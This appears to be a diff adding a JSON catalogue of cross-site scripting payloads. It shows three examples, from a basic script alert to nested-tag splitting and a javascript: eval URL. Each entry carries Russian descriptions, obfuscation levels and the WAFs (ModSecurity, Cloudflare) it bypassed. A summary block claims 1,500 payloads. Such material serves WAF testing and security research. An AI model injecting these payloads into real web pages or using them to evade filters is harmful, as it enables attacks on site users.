@@ -1,0 +1,47 @@
+{
+  "payloads": [
+    {
+      "id": 1,
+      "type": "reflected",
+      "category": "basic",
+      "payload": "<script>alert('XSS')</script>",
+      "description": "Базовый XSS через script тег",
+      "obfuscation_level": 1,
+      "bypass_techniques": ["none"],
+      "tested_on": ["ModSecurity", "Cloudflare"]
+    },
+    {
+      "id": 2,
+      "type": "reflected",
+      "category": "obfuscated",
+      "payload": "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+      "description": "Обфускация через вложенные теги",
+      "obfuscation_level": 3,
+      "bypass_techniques": ["tag_splitting"],
+      "tested_on": ["ModSecurity"]
+    },
+    {
+      "id": 3,
+      "type": "dom-based",
+      "category": "advanced",
+      "payload": "javascript:eval('alert\\'XSS\\'')",
+      "description": "DOM-based через javascript:",
+      "obfuscation_level": 4,
+      "bypass_techniques": ["javascript_protocol", "eval"],
+      "tested_on": ["Cloudflare"]
+    }
+  ],
+  "statistics": {
+    "total_payloads": 1500,
+    "by_type": {
+      "reflected": 600,
+      "stored": 500,
+      "dom_based": 400
+    },
+    "by_obfuscation": {
+      "basic": 300,
+      "medium": 700,
+      "advanced": 500
+    }
+  }
+}
